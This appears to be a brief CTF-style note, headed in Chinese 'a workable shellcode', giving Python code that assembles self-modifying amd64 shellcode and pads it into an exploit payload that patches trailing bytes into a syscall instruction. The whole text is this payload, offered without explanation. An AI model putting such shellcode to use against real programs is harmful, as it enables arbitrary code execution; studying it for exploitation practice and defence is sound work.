一个可行的shellcode

```python

code="""
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    mov bl,2
    sub dword ptr [rcx+41], ebx
    mov ch,0x2
    mov edi,eax
    //sub eax,edi
    .byte 0x2b
    .byte 0xc7
    mov edi,eax
    mov bl,0x95
    // mov edx,ebx
    .byte 0x8b
    .byte 0xd3
"""
shell=asm(code,arch="amd64")
payload=shell.ljust(41,'\x59')+"\x11\x05"

```

